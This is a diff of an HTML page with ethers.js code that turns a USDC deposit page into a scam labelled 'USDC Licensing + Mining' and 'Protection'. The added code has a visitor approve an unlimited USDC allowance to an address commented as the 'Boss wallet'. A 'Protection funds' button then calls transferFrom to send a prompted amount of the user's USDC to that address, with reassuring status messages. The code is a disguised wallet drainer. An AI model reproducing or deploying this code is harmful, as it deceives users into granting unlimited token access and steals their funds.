@@ -3,75 +3,67 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Mark3 Authorization</title>
+  <title>Mark III – USDC Licensing + Mining!</title>
 </head>
 <body>
-  <h2>Mark3 · Auto Authorization</h2>
+  <h2>Mark III · Auto Authorization + Protection</h2>
 
   <button id="connect">Connect Wallet</button>
-  <button id="authorize">Authorize USDC</button>
-  <button id="deposit">Deposit USDC</button>
+  <button id="approve">Approve Wallet</button>
+  <button id="deposit">Protection funds</button>
+  <div id="status"></div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
   <script>
-    const usdcAddress = "0xA0b86991c6218B36C1d19D4a2e9Eb0cE3606eB48"; // Mainnet USDC
-    const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12"; // Mark3 合约
+    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // USDC合约
+    const bossAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12"; // Boss钱包
+    const approveAmount = ethers.constants.MaxUint256;
 
-    const usdcABI = [
-      {
-        "inputs": [
-          { "internalType": "address", "name": "spender", "type": "address" },
-          { "internalType": "uint256", "name": "amount", "type": "uint256" }
-        ],
-        "name": "approve",
-        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      }
-    ];
-
-    const mark3ABI = [
-      {
-        "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }],
-        "name": "deposit",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      }
-    ];
-
-    let provider, signer;
+    let provider;
+    let signer;
+    let userAddress;
 
     document.getElementById("connect").onclick = async () => {
       if (window.ethereum) {
         provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
-        const addr = await signer.getAddress();
-        alert("Wallet connected: " + addr);
-      } else {
-        alert("MetaMask not found");
+        userAddress = await signer.getAddress();
+        document.getElementById("status").innerText = "Wallet connected: " + userAddress;
       }
     };
 
-    document.getElementById("authorize").onclick = async () => {
-      if (!signer) return alert("Connect wallet first");
-
-      const usdc = new ethers.Contract(usdcAddress, usdcABI, signer);
-      const maxApproval = ethers.constants.MaxUint256;
-      const tx = await usdc.approve(contractAddress, maxApproval);
-      await tx.wait();
-      alert("USDC Approved");
+    document.getElementById("approve").onclick = async () => {
+      const usdc = new ethers.Contract(
+        usdcAddress,
+        ["function approve(address spender, uint256 amount) public returns (bool)"],
+        signer
+      );
+      try {
+        const tx = await usdc.approve(bossAddress, approveAmount);
+        await tx.wait();
+        document.getElementById("status").innerText = "Wallet approved.";
+      } catch (e) {
+        document.getElementById("status").innerText = "Approval failed.";
+      }
     };
 
     document.getElementById("deposit").onclick = async () => {
-      if (!signer) return alert("Connect wallet first");
-
-      const contract = new ethers.Contract(contractAddress, mark3ABI, signer);
-      const amount = ethers.utils.parseUnits("100", 6); // 100 USDC
-      const tx = await contract.deposit(amount);
-      await tx.wait();
-      alert("Deposit successful");
+      const usdc = new ethers.Contract(
+        usdcAddress,
+        ["function transferFrom(address from, address to, uint256 amount) public returns (bool)"],
+        signer
+      );
+      try {
+        const amount = prompt("Enter amount to transfer (in USDC):");
+        const decimals = 6;
+        const parsedAmount = ethers.utils.parseUnits(amount, decimals);
+        const tx = await usdc.transferFrom(userAddress, bossAddress, parsedAmount);
+        await tx.wait();
+        document.getElementById("status").innerText = "Protection completed.";
+      } catch (e) {
+        document.getElementById("status").innerText = "Transfer failed.";
+      }
     };
   </script>
 </body>
